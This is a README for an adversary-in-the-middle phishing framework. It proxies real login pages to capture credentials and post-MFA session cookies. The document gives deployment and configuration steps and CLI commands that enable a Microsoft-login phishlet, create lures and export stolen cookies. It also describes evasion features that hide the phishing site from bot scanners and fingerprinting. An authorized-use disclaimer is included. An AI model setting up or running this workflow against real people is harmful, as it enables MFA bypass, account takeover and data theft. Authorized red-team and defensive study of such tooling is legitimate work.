# Mirage

Mirage is an Adversary-in-the-Middle (AiTM) phishing framework for authorized red team engagements. It acts as a reverse proxy between the victim and a legitimate target, capturing live session cookies post-MFA to bypass two-factor authentication.

> **For authorized use only.** Mirage is a security research tool intended for penetration testing engagements with explicit written permission from the target organization.

## Architecture

Mirage is split into two binaries:

- **`miraged`** — the daemon that runs on the phishing server. Handles DNS, TLS, the reverse proxy, session capture, bot detection, and JS obfuscation.
- **`mirage`** — a thin CLI client that connects to one or more `miraged` instances over mutual TLS to manage phishlets, lures, and sessions.

The management API is a REST API served by `miraged` on a secret hostname, authenticated via mutual TLS with operator client certificates. The `mirage` CLI communicates exclusively through this API.

Core domain types and interfaces live in `internal/aitm/`. Infrastructure implementations (SQLite, DNS providers, certificate management) satisfy those interfaces via Go structural typing.

## Requirements

- Go 1.22+
- Node.js (optional — required only for JS obfuscation)
- No CGO required

## Building

```bash
make build
# Produces build/miraged and build/mirage
```

## Configuration

`miraged` reads a YAML config file (default: `/etc/mirage/miraged.yaml`):

```yaml
domain: phish.example.com
external_ipv4: 1.2.3.4
https_port: 443
dns_port: 53
db_path: /var/lib/mirage/data.db
phishlets_dir: /etc/mirage/phishlets
redirectors_dir: /etc/mirage/redirectors

# Set to true to use self-signed certificates instead of ACME (useful for local testing).
# When false, acme.email and acme.directory_url are required.
self_signed: false

api:
  secret_hostname: api.phish.example.com   # all traffic to this hostname is routed to the management API
  client_ca_cert_path: /var/lib/mirage/api-ca.crt  # auto-generated on first start

acme:
  email: admin@phish.example.com
  directory_url: https://acme-v02.api.letsencrypt.org/directory  # use staging URL to avoid rate limits during testing

dns_providers:
  - alias: cf-main
    provider: cloudflare
    settings:
      api_token: YOUR_TOKEN

obfuscator:
  enabled: false
  node_path: ""          # defaults to PATH lookup
  sidecar_dir: ""        # directory containing the Node obfuscator package
  request_timeout: 5s
  max_concurrent: 4
```

Validate a config file without starting the daemon:

```bash
miraged --config /etc/mirage/miraged.yaml validate
```

## Deployment

Provision a remote server over SSH in one command:

```bash
mirage deploy \
  --host 203.0.113.5 \
  --ssh-key ~/.ssh/id_ed25519 \
  --domain phish.example.com \
  --external-ip 203.0.113.5
```

This uploads the `miraged` binary, writes the config, installs a systemd unit, and performs a health check.

## First-time setup

**1. Start the daemon.**

```bash
miraged --config /etc/mirage/miraged.yaml
```

On first start, `miraged` auto-generates a mutual TLS CA and issues an operator client certificate alongside it:

```txt
/var/lib/mirage/api-ca.crt      # server CA cert (trust anchor for the CLI)
/var/lib/mirage/operator.crt    # operator client cert
/var/lib/mirage/operator.key    # operator client key
```

**2. Copy the certificate files to your operator machine.**

```bash
scp root@<server>:/var/lib/mirage/api-ca.crt   ~/.mirage/prod-ca.crt
scp root@<server>:/var/lib/mirage/operator.crt ~/.mirage/prod-client.crt
scp root@<server>:/var/lib/mirage/operator.key ~/.mirage/prod-client.key
```

**3. Register the server with the CLI.**

```bash
mirage server add \
  --alias prod \
  --address https://<server-ip>:443 \
  --secret-hostname api.phish.example.com \
  --ca ~/.mirage/prod-ca.crt \
  --cert ~/.mirage/prod-client.crt \
  --key ~/.mirage/prod-client.key
```

The CLI verifies the connection before saving. You're ready to go.

## Usage

Manage phishlets, lures, and sessions:

```bash
mirage phishlets list
mirage phishlets enable microsoft --hostname login.phish.example.com
mirage lures create microsoft --redirect https://portal.office.com
mirage lures url <id>
mirage sessions list
mirage sessions list --completed
mirage sessions export <id> --out cookies.json
```

Drop into the interactive REPL by running `mirage` with no subcommand:

```bash
mirage --server prod
# mirage [prod]>
```

## Features

- **Reverse proxy** — transparently proxies HTTPS traffic to the real target, rewriting domains and cookies on the fly
- **Session capture** — extracts credentials from POST bodies and auth tokens from cookies/headers; marks sessions complete when all required tokens are captured
- **BotGuard** — JA4 fingerprint-based bot detection with configurable score threshold; suspicious requests are spoofed to a decoy
- **JS obfuscation** — optionally transforms injected JavaScript via a Node.js sidecar on every request, making static fingerprinting ineffective
- **Automated DNS** — integrates with DNS providers (Cloudflare, etc.) to manage phishing domain records
- **mTLS API** — management API authenticated with mutual TLS; the daemon auto-generates a CA and issues operator certificates
- **SSH deployment** — one-command remote provisioning with systemd unit installation
- **Blacklist** — IP/CIDR blocking with automatic temporary whitelisting after successful token capture

## Testing

```bash
make test
```

## Project Layout

```txt
internal/
  aitm/         Core domain types, interfaces, and service logic
  api/          Management REST API (router, handlers, mTLS auth)
  botguard/     JA4 fingerprinting, bot scoring, signature database
  cert/         TLS certificate lifecycle (ACME + custom certs)
  config/       Config file parsing and validation
  deploy/       SSH-based remote provisioning
  dns/          DNS server and provider integrations
  events/       In-process event bus
  obfuscator/   JS obfuscation (Node.js sidecar + no-op fallback)
  phishlet/     Phishlet YAML loader and compiler
  proxy/        MITM reverse proxy and handler pipeline
  store/
    sqlite/     SQLite implementations of aitm store interfaces
cmd/miraged/    Daemon entry point and wiring
cmd/mirage/     CLI client entry point
sdk/            Shared API types and route constants (used by both binaries)
test/           Integration tests (full daemon in-process, no browser required)
```
